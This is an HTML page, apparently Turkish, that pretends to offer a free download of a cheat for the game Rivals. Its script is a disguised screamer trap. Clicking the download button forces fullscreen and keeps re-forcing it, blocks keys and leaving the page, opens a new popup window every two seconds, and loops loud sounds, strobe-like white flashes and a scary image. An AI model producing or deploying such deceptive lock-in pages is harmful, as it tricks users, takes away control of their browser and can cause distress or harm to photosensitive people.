<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PagonWare Premium - Rivals Private Cheat</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Creepster&family=Segoe+UI:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #191919;
            --accent: #269cc8;
            --horror: #ff0000;
        }

        body, html {
            margin: 0; padding: 0; width: 100%; height: 100%;
            background-color: var(--primary); color: #fff;
            font-family: 'Segoe UI', sans-serif; overflow: hidden;
        }

        /* --- MODERN ARAYÜZ (TUZAK) --- */
        #main-site {
            position: relative; width: 100%; height: 100%;
            display: flex; flex-direction: column; z-index: 10;
        }

        header {
            padding: 25px; border-bottom: 1px solid rgba(255,255,255,0.1);
            display: flex; justify-content: space-between; align-items: center;
        }

        .hero {
            flex: 1; display: flex; align-items: center; justify-content: space-around;
            padding: 50px;
        }

        .btn-download {
            background: var(--accent); color: white; padding: 20px 50px;
            border: none; border-radius: 8px; font-weight: bold; font-size: 20px;
            cursor: pointer; transition: 0.3s; text-transform: uppercase;
            box-shadow: 0 0 20px rgba(38,156,200,0.4);
        }

        /* --- KORKU KATMANI --- */
        #horror-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #000; z-index: 99999; display: none;
            flex-direction: column; justify-content: center; align-items: center;
            cursor: none;
        }

        #scary-img {
            width: 100%; height: 100%; object-fit: cover;
            display: none; position: absolute; top: 0; left: 0;
        }

        .glitch {
            font-family: 'Creepster', cursive; font-size: 9rem;
            color: var(--horror); text-align: center;
            z-index: 100; animation: chaos 0.05s infinite;
        }

        @keyframes chaos {
            0% { transform: translate(5px, 5px) skew(5deg); filter: invert(0) sepia(1); }
            50% { transform: translate(-5px, -10px) skew(-5deg); filter: invert(1) blur(2px); }
            100% { transform: translate(10px, 5px) rotate(2deg); }
        }

        .flash {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: white; opacity: 0; pointer-events: none; z-index: 100000;
        }
    </style>
</head>
<body oncontextmenu="return false;">

    <div id="main-site">
        <header>
            <div style="font-size:30px; font-weight:bold;">Pagon<span>Ware</span></div>
            <div style="color:#27ae60;"><i class="fas fa-check-circle"></i> VİRAL KORUMASI AKTİF</div>
        </header>
        <div class="hero">
            <div>
                <h1 style="font-size:55px;">Rivals External V2</h1>
                <p style="color:#888; margin-bottom:30px;">Algılanamaz hile deneyimi için hemen yükleyin.</p>
                <button class="btn-download" onclick="startDoom()">ÜCRETSİZ İNDİR</button>
            </div>
            <img src="https://i.hizliresim.com/n2o0qor.png" width="450" style="border-radius:20px;">
        </div>
    </div>

    <div id="horror-overlay">
        <h1 class="glitch">ASLA ÇIKAMAYACAKSIN</h1>
        <img src="https://i.ibb.co/L6vV5vK/scary.jpg" id="scary-img">
    </div>

    <div class="flash" id="flash-effect"></div>

    <audio id="s1" src="https://www.soundjay.com/human/sounds/shout-01.mp3" preload="auto"></audio>
    <audio id="s2" src="https://www.fesliyanstudios.com/play-mp3/5647" preload="auto"></audio>
    <audio id="amb1" src="https://www.soundjay.com/human/sounds/whisper-1.mp3" loop></audio>
    <audio id="amb2" src="https://www.soundjay.com/mechanical/sounds/drone-01.mp3" loop></audio>

    <script>
        let doom = false;

        function forceFull() {
            let d = document.documentElement;
            if (d.requestFullscreen) d.requestFullscreen();
            else if (d.webkitRequestFullscreen) d.webkitRequestFullscreen();
            else if (d.msRequestFullscreen) d.msRequestFullscreen();
        }

        function startDoom() {
            doom = true;
            forceFull();
            
            document.getElementById('main-site').style.display = 'none';
            document.getElementById('horror-overlay').style.display = 'flex';
            
            // Tüm sesleri aynı anda ve yüksek sesle başlat
            let audios = ['s1', 's2', 'amb1', 'amb2'];
            audios.forEach(id => {
                let a = document.getElementById(id);
                a.volume = 1.0;
                if(id.startsWith('amb')) a.play();
            });

            // Çıkışı Engelle
            window.onbeforeunload = () => { return "RUHUNU BURADA BIRAKTIN."; };

            // 1. Agresif Jumpscare Döngüsü (Her 2.5 saniyede bir)
            setInterval(triggerJump, 2500);

            // 2. Pencere Bombası (Her 2 saniyede bir)
            setInterval(() => {
                window.open(window.location.href, '_blank', 'width=200,height=200');
            }, 2000);

            // 3. Tam Ekran Gardiyanı (Kaçışı imkansız kılar)
            setInterval(() => {
                if(doom && !document.fullscreenElement) {
                    forceFull();
                }
            }, 100);
        }

        function triggerJump() {
            const img = document.getElementById('scary-img');
            const flash = document.getElementById('flash-effect');
            const s1 = document.getElementById('s1');
            const s2 = document.getElementById('s2');

            img.style.display = 'block';
            
            // Sesleri patlat
            s1.currentTime = 0; s1.play();
            setTimeout(() => { s2.currentTime = 0; s2.play(); }, 100);

            // Görsel Flaşlar
            flash.style.opacity = '1';
            setTimeout(() => { flash.style.opacity = '0'; }, 100);

            setTimeout(() => { img.style.display = 'none'; }, 1200);
        }

        // Tuş Kilidi ve F11/ESC Koruması
        window.addEventListener('keydown', (e) => {
            if(doom) {
                e.preventDefault();
                forceFull(); // Herhangi bir tuşa basıldığında tam ekranı tazeler
                return false;
            }
        });

        // Fare hareket ettikçe ekranı titret (Ekstra rahatsızlık)
        window.addEventListener('mousemove', () => {
            if(doom && Math.random() > 0.8) {
                document.body.style.transform = `translate(${Math.random()*10}px, ${Math.random()*10}px)`;
            }
        });
    </script>
</body>
</html>
